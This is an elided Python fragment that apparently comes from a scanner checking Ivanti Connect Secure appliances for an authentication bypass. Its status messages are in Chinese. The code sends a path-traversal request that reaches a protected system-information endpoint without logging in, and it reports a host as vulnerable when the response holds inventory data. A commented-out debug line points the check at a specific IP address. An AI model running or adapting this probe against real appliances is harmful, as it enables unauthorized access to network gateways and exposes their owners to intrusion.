...
def ty(url,s_cookie=None):
    ...
    try:
        ...
        gf = requests.get(url+'api/v1/totp/user-backup-code/../../system/system-information',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        ...
        if gf.status_code == 200 and "information" in gf.text and "software-inventory" in gf.text:
        ...
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://210.22.184.41/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ lvanti Connect Secure验证绕过]\n\n'+ str (uia)+'\n'
